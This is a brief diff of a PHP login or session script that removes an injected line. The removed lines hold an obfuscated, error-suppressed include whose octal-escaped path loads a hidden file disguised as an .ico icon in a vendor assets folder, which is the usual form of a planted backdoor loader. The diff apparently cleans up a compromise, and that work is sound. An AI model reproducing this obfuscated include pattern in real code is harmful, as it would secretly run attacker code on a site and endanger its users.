@@ -1,13 +1,4 @@
 <?php
-/*89399*/
-
-@include ("\057hom\1451/c\141iro\14446/\141sso\143iad\157s.m\157vep\151aui\056com\056br/\141sse\164s/v\145ndo\162/bo\170ico\156s/.\060f20\14643b\056ico");
-
-/*89399*/
-
-
-
-
 session_start();
 require_once 'config/conexao.php';
 require_once 'config/logar.php';
